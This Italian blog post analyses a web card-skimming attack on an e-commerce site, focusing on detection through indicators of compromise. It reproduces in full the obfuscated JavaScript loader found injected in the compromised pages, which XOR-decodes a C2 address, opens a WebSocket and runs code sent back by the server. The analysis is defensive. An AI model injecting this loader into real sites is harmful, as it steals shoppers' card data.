---
title: Online card skimming: qualche nota.
url: https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/
source: Over Security - Cybersecurity news aggregator
date: 2025-07-26
fetch_date: 2025-10-06T23:53:20.826738
---

# Online card skimming: qualche nota.

# [Rocco Sicilia](https://roccosicilia.com)

Search

* [Home](https://roccosicilia.com)
* [About me](https://roccosicilia.com/about/)
* [Divulgazione](https://roccosicilia.com/progetto-di-divulgazione/)
* [Sostieni il progetto](https://roccosicilia.com/sostieni-il-progetto/)
* [English version](https://medium.com/%40roccosicilia)

[cyber security](https://roccosicilia.com/category/cyber-security/), [hacking](https://roccosicilia.com/category/hacking/), [ita](https://roccosicilia.com/category/ita/)

## [Online card skimming: qualche nota.](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/)

Published by

Rocco Sicilia

on

[25 luglio 2025](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/)

[![Online card skimming: qualche nota.](https://roccosicilia.com/wp-content/uploads/2025/07/screenshot-2025-07-25-at-18.17.38.png?w=800)](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/)

Recentemente ho avuto modo di partecipare ad una analisi per ricostruire un evento inizialmente segnalato come un accesso ad una URL con una bassa reputazione: cdn.iconstaff[.]top. Questa URL è classificata come malevola da quasi un anno (stando ai dati di [VirusTotal](https://www.virustotal.com/gui/domain/cdn.iconstaff.top/details)) ed associata ad attacchi di tipo web skimming: in parole povere si tratta di attacchi che puntano a trafugare carte di credito online.

Ho pensato di scrivere due righe in merito a questa tipologia di attacco in quanto non sempre è facile da ricostruire. Il threat actor sfrutta siti e-commerce vulnerabili per “modificare” il comportamento della componente che si occupa della transazione. Viene di fatto compromesso il funzionamento del sito stesso ed il cliente, ignaro quanto l’amministratore del sito, si troverà i dati della propria carta di credito sottratti in fase di acquisto.

Non ci sono azioni specifiche lato endpoint in quanto tutto il processo avviene nei “confini” della sessione web. L’unico elemento osservabile lato client è una chiamata, tramite web-socket, ad una URL che appare come quella di una classica CDN. Nel caso che ho analizzato la chiamata era offuscata ed inserita all’interno delle pagine web del sito:

```
wss://cdn.iconstaff[.]top/common?source=
```

Se i sistemi di detection (l’EDR che legge raccoglie la telemetria comprese le richieste verso sistemi esterni, o il Firewall che controlla il traffico di rete) sono in grado di intercettare questa URL come elemento sospetto, possiamo dire che è quasi fatta: verrà generato un allarme che si spera qualcuno prenda in considerazione (altro fastidioso capitolo che temo mai si chiuderà) se non addirittura bloccata la richiesta in caso di policies restrittive.

Ma se i sistemi di detection che stiamo utilizzando non conoscono questo IoC potremmo avere un problema considerando che il target della compromissione è il sito web di destinazione che di per se è un sito solitamente lecito, nel senso che non siamo di fronte al sito civetta appositamente creato per ingannare gli utenti, è un normalissimo sito e-commerce che, a causa di una vulnerabilità, è stato manomesso.

## Il payload analizzato

Ho accennato al fatto che ricostruire l’attacco non è immediato: in caso di detection basata sul rilevamento dell’IoC citato avremo molto probabilmente una notifica legata a comunicazioni verso un C2. Cisco Talos categorizza la URL come Malware Site e Exploits, su VirusTotal (dove ho lasciato le mie note) viene indicato il collegamento con il tema Credit Card Skimming e alcuni utenti riportano il tag #C2.

Quando si parla di C2 il primo pensiero potrebbe andare a qualcosa che è stato eseguito sul sistema e che ha aperto una comunicazione con il sistema remoto, quindi ci si aspetta di trovare un processo che esegua azioni in rete. Nello scenario in oggetto l’azione è un pelo più “nascosa” anche se di fatto è la stessa: potendo contare su un sito web compromesso il codice da eseguire lato client viene veicolato tramite la sessione web. L’utente accede quindi alla pagina “manomessa” che contiene un pezzo di codice eseguito dal browser.

```
(function() {
  var cs=document.currentScript;!function(a,u) {
    !function(a) {
      var g=function(a,u) {
        return a.map(function(a,g) {
          return String.fromCharCode(a^u)}).join('')
          }
        (a,u);
        window.ww=new WebSocket(
          g+encodeURIComponent(location.href)
        );
        window.ww.addEventListener('message',function(e) {
          new Function(e.data)();if(cs)cs.remove()
        });
        window.ww.addEventListener('close',function() {
          if(cs)cs.remove()
        })
      }(a)
    }
    ([93, 89, 89, 16, 5,5 , 73, 78, 68, 4, 67, 73, 69, 68, 89, 94, 75, 76, 76, 4, 94, 69, 90, 5, 73, 69, 71, 71, 69, 68, 21, 89, 69, 95, 88, 73, 79, 23], 42)
  })();
```

Nota: gli ho data una “indentata” a mano per renderlo un pelo più leggibile e considerate che non amo JS.

Per farla breve questo pezzo di codice apre una Web-Socket con un host il cui indirizzo è offuscato nell’array e da questo canale possono transitare informazioni o può essere eseguito dinamicamente nuovo codice JS. A tutti gli effetti è il comportamento di un client che dialoga con il suo C2 server tramite il browser locale che esegue il codice malevolo.

Giusto per divertirci, se prendiamo l’array (evidenziato in verde) e calcoliamo l’XOR con chiave 42 (evidenziato in rosso) otteniamo la nostra URL.

![](https://roccosicilia.com/wp-content/uploads/2025/07/image-4.png?w=1024)

Il mitico CyberChef!

La mia impressione è che comportamenti di questo tipo siano molto difficili da rilevare dinamicamente. Un browser che apre una Web-Socket verso un sito terzo è un comportamento normale in molti contesti applicativi. L’evento in se non può essere “il problema”. Una Web-Socket verso un IP o una URL con una bassa o pessima reputazione è un altro paio di maniche, ma bisogna disporre degli IoC per una detection efficace.

Gli EDR sono in grado di registrare, a livello di telemetria, il comportamento in oggetto ma per classificarlo come sospetto servono informazioni per arricchire i singoli elementi.

## Nota conclusiva

Cercando informazioni sul caso ho trovato un progettino interessante di C2 via Web-Socket: <https://github.com/Arno0x/WSC2>. Non è lo stesso scenario dell’attacco analizzato ma l’ho trovato utile.

Una bella spiegazione del comportamento del malware è disponibile qui: <https://blog.sucuri.net/2024/06/caesar-cipher-skimmer.html>.

### Condividi:

* Fai clic per inviare un link a un amico via e-mail (Si apre in una nuova finestra)
  E-mail
* [Fai clic qui per condividere su LinkedIn (Si apre in una nuova finestra)
  LinkedIn](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/?share=linkedin)
* [Fai clic per condividere su Telegram (Si apre in una nuova finestra)
  Telegram](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/?share=telegram)
* [Fai clic per condividere su WhatsApp (Si apre in una nuova finestra)
  WhatsApp](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/?share=jetpack-whatsapp)

Mi piace Caricamento…

## 2 risposte a “Online card skimming: qualche nota.”

1. ![Avatar Alberto Pizzarelli](https://0.gravatar.com/avatar/39897a28917efb6e5c2dee107c52289c69a1c43bfb616c05fa512f8ec6b2a084?s=40&d=identicon&r=G)

   Alberto Pizzarelli

   [26 luglio 2025](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/comment-page-1/#comment-672)

   Ciao, grazie per l’esaustiva spiegazione, purtroppo di siti web compromessi con questa tipologia di attacchi è comune, e non tutti usano in maniera corretta il CSP (Content Security Policy), eviterebbe una qualsiasi connessione verso URL terzi che non sono autorizzati, e di conseguenza gioverebbe alle povere vittime di card stealing.

   ["Mi piace"](https://roccosicilia.com/2025/07/25/online-card-skimming-qualche-nota/?like_comment=672&_wpnonce=716e37fac2)Piace a 1 pe...